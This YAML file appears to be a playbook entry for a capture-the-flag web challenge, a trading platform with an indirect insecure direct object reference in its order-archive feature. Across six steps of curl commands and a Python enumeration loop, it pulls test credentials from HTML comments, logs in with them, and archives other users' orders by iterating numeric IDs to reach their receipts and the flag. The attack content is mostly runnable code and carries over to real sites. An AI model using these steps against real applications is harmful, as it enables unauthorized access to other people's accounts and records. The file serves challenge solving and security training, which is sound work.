name: idor_indirect_trading_platform
category: web
tags: [idor, default_credentials, broken_authorization, session, indirect_reference]
indicators:
  - "Login form with order/archive system"
  - "Numeric ID in URL (e.g., /order/123/archive)"
  - "Credentials hint in HTML comments"
  - "Archive function lacks authorization check"

tricks:
  - name: "Step 1: Check HTML source for credentials"
    when: "First access, login required"
    how: "View page source for <!-- comments with test credentials"
    payload: |
      curl -s http://TARGET/ | grep -i '<!--'
      # Found: <!-- TODO: Delete the testing account (test:test). -->

  - name: "Step 2: Login with default credentials"
    when: "Found credentials in comments"
    how: "Two-step login: POST username, then POST password"
    payload: |
      curl -c cookies.txt -d 'username=test' http://TARGET/
      curl -b cookies.txt -c cookies.txt -d 'password=test' http://TARGET/password/test

  - name: "Step 3: Discover archive functionality"
    when: "Login successful"
    how: "Navigate dashboard to find /order/{id}/archive endpoint"
    payload: |
      curl -b cookies.txt http://TARGET/dashboard
      # Found: Archive button links to /order/{id}/archive

  - name: "Step 4: Exploit indirect IDOR via archive"
    when: "Found archive endpoint"
    how: "Archive other users' orders to gain access to their receipts"
    payload: |
      # Archive order without ownership check
      curl -b cookies.txt http://TARGET/order/300198/archive
      # Now you can view the receipt as the archiver

  - name: "Step 5: Enumerate and archive orders"
    when: "Need to find the flag order"
    how: "Iterate through order IDs, archive each, check receipts"
    payload: |
      import requests

      s = requests.Session()
      # ... login first ...

      for id in range(300100, 300250):
          s.get(f'http://TARGET/order/{id}/archive')
          resp = s.get(f'http://TARGET/order/{id}/receipt')
          if 'FLAG{' in resp.text:
              print(f'Found flag at order {id}')
              break

  - name: "Step 6: Extract the flag"
    when: "Found valid order ID"
    how: "Flag is in order ID 300198"
    payload: |
      curl -b cookies.txt http://TARGET/order/300198/archive
      curl -b cookies.txt http://TARGET/order/300198/receipt
      # FLAG{...}
